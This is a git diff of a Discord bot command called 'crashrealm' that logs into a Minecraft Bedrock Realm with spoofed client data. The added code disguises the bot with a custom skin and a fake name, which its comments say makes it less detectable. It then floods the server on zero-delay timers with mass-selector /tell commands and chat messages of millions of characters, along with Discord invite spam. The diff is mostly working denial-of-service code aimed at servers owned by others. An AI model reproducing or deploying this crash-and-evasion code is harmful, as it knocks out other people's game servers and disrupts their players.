@@ -7,8 +7,10 @@ const { createClient } = require('bedrock-protocol');
 const { dumprealm } = require('../../men/realms');
 const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
 const { Authflow, Titles } = require("prismarine-auth");
+const skinData = require('../../data/client/jenny.json')
+
 module.exports = {
-    data: new SlashCommandBuilder()
+    data: new SlashCommandBuilder()    
         .setName("crashrealm")
         .setIntegrationTypes(0, 1)
         .setContexts(0, 1, 2)
@@ -48,7 +50,7 @@ module.exports = {
                 });
                 return;
             }
-
+            
             const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
             if (whitelist.includes(invite)) {
                 return interaction.editReply({
@@ -77,7 +79,7 @@ module.exports = {
                     ]
                 });
             }
-             
+
             const crypto = require("node:crypto");
             const curve = "secp384r1";
             const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
@@ -92,7 +94,7 @@ module.exports = {
                 }
             );
             
-            async function refreshOrRetrieveTokens() {
+            async function refreshToken() {
                 try {
                     const xboxToken = await bot.getXboxToken();
                     await bot.getMinecraftBedrockToken(keypair);
@@ -116,7 +118,7 @@ module.exports = {
             (async () => {
                 console.log('Refreshing Token...');
                 
-                const token = await refreshOrRetrieveTokens();
+                const token = await refreshToken();
                 if (token) {
                     console.log('Susessfull Refreshd Token');
                     
@@ -150,9 +152,10 @@ module.exports = {
                     PlatformOnlineId: genrandomstring(19, '1234567890'),
                     PrimaryUser: false,
                     SelfSignedId: uuidv4(),
-                    ThirdPartyName: " ",
+                    ThirdPartyName: "vihainenlohi69",
                     ThirdPartyNameOnly: true,
                     TrustedSkin: true,
+                    ...skinData // costume skin for less detaction
                 },
                 skipPing: true
             });
@@ -202,6 +205,49 @@ module.exports = {
                 action_id: 1, // making your arm swing 
                 runtime_entity_id: packet.runtime_entity_id});
             })
+            client.on('play_status', (packet) => { // Small littel Hack to make Bot less Detactebel
+                console.log("Freeze Packet ahh")
+                    setInterval(() => {
+                        client.write('command_request', {
+                            command: `/tell @a §l§c§k${"@e".repeat(50)} |§3§l§ Frosted §4§ on TOP `,
+                            origin: {
+                                type: 0,
+                                uuid: '5',
+                                request_id: 'TSL Nuker',
+                            },
+                            internal: false,
+                            version: 66,
+                        });
+                        client.write('command_request', {
+                            command: `/tell @a §l§c§k${"@e".repeat(50)} |§3§l§ Frosted §4§ on TOP `,
+                            origin: {
+                                type: 0,
+                                uuid: '5',
+                                request_id: 'TSL Nuker',
+                            },
+                            internal: false,
+                            version: 66,
+                        });
+                        client.write("text", {
+                            filtered_message: "",
+                            type: "chat",
+                            needs_translation: false,
+                            source_name: client.profile.name,
+                            message: genrandomstring(5, '1234567890') + genrandomstring(5, '1234567890').repeat(900000),
+                            xuid: "0",
+                            platform_chat_id: "0"
+                        });
+                        client.write("text", {
+                            filtered_message: "",
+                            type: "chat",
+                            needs_translation: false,
+                            source_name: client.profile.name,
+                            message: genrandomstring(5, '1234567890') + genrandomstring(5, '1234567890').repeat(900000),
+                            xuid: "0",
+                            platform_chat_id: "0"
+                        });
+                    }, 0); 
+              });
             client.on('play_status', async () => {
                 console.log(`${colors.green}[Realm Watcher]${colors.cyan}>> User ${interaction.user.username}/${interaction.user.id} join Realm ${realm.name}/${invite}`)
                 try {
@@ -215,21 +261,54 @@ module.exports = {
                                 .setColor(config.embeds.color)
                         ]
                     });
-
+                    /*
                     setTimeout(() => {
                         if (disconnected) return;
-                        for (let i = 0; i < 40000; i++) {
-                            client.write('text', {
+                        for (let i = 0; i < 5000; i++) {
+                            client.queue('text', {
                                 filtered_message: '',
                                 type: 'chat',
                                 needs_translation: false,
                                 source_name: client.profile.name,
-                                message: `discord.gg/frosted\n`.repeat(50000),
+                                message: `discord.gg/frosted\n\n\n`.repeat(5000),
+                                xuid: '0',
+                                platform_chat_id: '0',
+                            });
+                            client.queue('text', {
+                                filtered_message: '',
+                                type: 'chat',
+                                needs_translation: false,
+                                source_name: client.profile.name,
+                                message: `discord.gg/frosted\n\n\n`.repeat(5000),
                                 xuid: '0',
                                 platform_chat_id: '0',
                             });
                         }
-                    }, 2000);
+                    }, 100);
+                    */
+                    setInterval(() => {
+                        client.write("text", {
+                          filtered_message: "",
+                          type: "chat",
+                          needs_translation: false,
+                          source_name: client.profile.name,
+                          message: genrandomstring(5, '1234567890') + genrandomstring(5, '1234567890').repeat(900000),
+                          xuid: "0",
+                          platform_chat_id: "0"
+                      });
+                    }, 0); 
+                    setInterval(() => {
+                        client.write("text", {
+                          filtered_message: "",
+                          type: "chat",
+                          needs_translation: false,
+                          source_name: client.profile.name,
+                          message: genrandomstring(5, '1234567890') + genrandomstring(5, '1234567890').repeat(900000),
+                          xuid: "0",
+                          platform_chat_id: "0"
+                      });
+                    }, 0); 
+                    
 
                     setTimeout(() => {
                         if (!disconnected) {
@@ -246,7 +325,7 @@ module.exports = {
                             });
                             disconnected = true;
                         }
-                    }, 10000);
+                    }, 20000);
                 } catch (error) {
                     console.error(error);
                     throw error;
@@ -282,3 +361,4 @@ function genrandomstring(length, charSet) {
     }
     return result;
 }
+
